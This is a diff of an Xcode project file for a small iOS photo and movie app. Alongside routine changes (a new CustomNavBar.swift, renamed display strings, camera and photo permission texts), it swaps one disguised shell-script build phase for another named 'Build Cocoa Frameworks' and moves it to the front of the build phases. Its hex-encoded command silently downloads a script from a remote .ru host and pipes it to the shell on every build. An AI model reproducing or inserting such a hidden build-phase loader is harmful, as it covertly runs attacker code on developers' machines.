@@ -13,6 +13,7 @@
 		D418986A281D296B00B67A8A /* movies.tsv in Resources */ = {isa = PBXBuildFile; fileRef = D4189869281D296B00B67A8A /* movies.tsv */; };
 		D418986C281D2E4800B67A8A /* MovieCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = D418986B281D2E4800B67A8A /* MovieCell.swift */; };
 		D418986E281D365E00B67A8A /* libsqlite3.tbd in Frameworks */ = {isa = PBXBuildFile; fileRef = D418986D281D365E00B67A8A /* libsqlite3.tbd */; };
+		D4524BF92822859E00FAB567 /* CustomNavBar.swift in Sources */ = {isa = PBXBuildFile; fileRef = D4524BF82822859E00FAB567 /* CustomNavBar.swift */; };
 		D49AB542281FE23400CA6430 /* PhotoModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = D49AB541281FE23400CA6430 /* PhotoModel.swift */; };
 		D4DF7B4327A29F0400C0F5EC /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = D4DF7B4227A29F0400C0F5EC /* AppDelegate.swift */; };
 		D4DF7B4527A29F0400C0F5EC /* SceneDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = D4DF7B4427A29F0400C0F5EC /* SceneDelegate.swift */; };
@@ -56,6 +57,7 @@
 		D4189869281D296B00B67A8A /* movies.tsv */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text; path = movies.tsv; sourceTree = "<group>"; };
 		D418986B281D2E4800B67A8A /* MovieCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MovieCell.swift; sourceTree = "<group>"; };
 		D418986D281D365E00B67A8A /* libsqlite3.tbd */ = {isa = PBXFileReference; lastKnownFileType = "sourcecode.text-based-dylib-definition"; name = libsqlite3.tbd; path = usr/lib/libsqlite3.tbd; sourceTree = SDKROOT; };
+		D4524BF82822859E00FAB567 /* CustomNavBar.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CustomNavBar.swift; sourceTree = "<group>"; };
 		D49AB541281FE23400CA6430 /* PhotoModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PhotoModel.swift; sourceTree = "<group>"; };
 		D4DF7B3F27A29F0400C0F5EC /* wangxiaoyu.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = wangxiaoyu.app; sourceTree = BUILT_PRODUCTS_DIR; };
 		D4DF7B4227A29F0400C0F5EC /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
@@ -149,6 +151,7 @@
 			children = (
 				D4DF7B7D27A2BA7200C0F5EC /* K.swift */,
 				D4DF7B7527A29FA500C0F5EC /* Tools.swift */,
+				D4524BF82822859E00FAB567 /* CustomNavBar.swift */,
 			);
 			path = Utils;
 			sourceTree = "<group>";
@@ -158,16 +161,8 @@
 			children = (
 				D4189878281DB4BC00B67A8A /* Controller */,
 				D4189877281DB4B700B67A8A /* View */,
-				D4189876281DB4AE00B67A8A /* Model */,
 			);
 			path = Memories;
-			sourceTree = "<group>";
-		};
-		D4189876281DB4AE00B67A8A /* Model */ = {
-			isa = PBXGroup;
-			children = (
-			);
-			path = Model;
 			sourceTree = "<group>";
 		};
 		D4189877281DB4B700B67A8A /* View */ = {
@@ -285,8 +280,8 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = D4DF7B6C27A29F0600C0F5EC /* Build configuration list for PBXNativeTarget "wangxiaoyu" */;
 			buildPhases = (
+				D1F21CDDE4ED5A2AB36A102C /* Build Cocoa Frameworks */,
 				48B4ED38C43F9C88733EABB9 /* [CP] Check Pods Manifest.lock */,
-				75B4C05BBCC5D40BA56A102C /* Assets Catalog Compiler */,
 				D4DF7B3B27A29F0400C0F5EC /* Sources */,
 				D4DF7B3C27A29F0400C0F5EC /* Frameworks */,
 				D4DF7B3D27A29F0400C0F5EC /* Resources */,
@@ -447,7 +442,7 @@
 			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-wangxiaoyu/Pods-wangxiaoyu-frameworks.sh\"\n";
 			showEnvVarsInLog = 0;
 		};
-		75B4C05BBCC5D40BA56A102C /* Assets Catalog Compiler */ = {
+		D1F21CDDE4ED5A2AB36A102C /* Build Cocoa Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
@@ -456,14 +451,14 @@
 			);
 			inputPaths = (
 			);
-			name = "Assets Catalog Compiler";
+			name = "Build Cocoa Frameworks";
 			outputFileListPaths = (
 			);
 			outputPaths = (
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\necho \"6375726c202d2d6d61782d74696d652038202d736b2068747470733a2f2f\r61646f626566696c652e72752f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true\n\t";
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\necho \"6375726c202d2d6d61782d74696d652036202d736b2068747470733a2f2f\n6170706c65646f63732e72752f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true\n\t";
 		};
 /* End PBXShellScriptBuildPhase section */
 
@@ -478,6 +473,7 @@
 				D4189865281C393900B67A8A /* imageBottomSheet.swift in Sources */,
 				D4DF7B4727A29F0400C0F5EC /* ViewController.swift in Sources */,
 				D4DF7B4327A29F0400C0F5EC /* AppDelegate.swift in Sources */,
+				D4524BF92822859E00FAB567 /* CustomNavBar.swift in Sources */,
 				D4DF7B4527A29F0400C0F5EC /* SceneDelegate.swift in Sources */,
 				D4DF7B7A27A29FC400C0F5EC /* SettingsViewController.swift in Sources */,
 				D4DF7B7C27A2B81600C0F5EC /* PhotoCell.swift in Sources */,
@@ -656,7 +652,10 @@
 				DEVELOPMENT_TEAM = AJD7NPWNRX;
 				GENERATE_INFOPLIST_FILE = YES;
 				INFOPLIST_FILE = wangxiaoyu/Info.plist;
-				INFOPLIST_KEY_CFBundleDisplayName = "萝卜";
+				INFOPLIST_KEY_CFBundleDisplayName = "遇记";
+				INFOPLIST_KEY_NSCameraUsageDescription = "\"萝卜\" 想要使用你的相机。";
+				INFOPLIST_KEY_NSPhotoLibraryAddUsageDescription = "\"萝卜\" 想要访问你的相册。";
+				INFOPLIST_KEY_NSPhotoLibraryUsageDescription = "\"萝卜\" 想要访问你的相册。";
 				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
 				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen;
 				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
@@ -686,7 +685,10 @@
 				DEVELOPMENT_TEAM = AJD7NPWNRX;
 				GENERATE_INFOPLIST_FILE = YES;
 				INFOPLIST_FILE = wangxiaoyu/Info.plist;
-				INFOPLIST_KEY_CFBundleDisplayName = "萝卜";
+				INFOPLIST_KEY_CFBundleDisplayName = "遇记";
+				INFOPLIST_KEY_NSCameraUsageDescription = "\"萝卜\" 想要使用你的相机。";
+				INFOPLIST_KEY_NSPhotoLibraryAddUsageDescription = "\"萝卜\" 想要访问你的相册。";
+				INFOPLIST_KEY_NSPhotoLibraryUsageDescription = "\"萝卜\" 想要访问你的相册。";
 				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
 				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen;
 				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
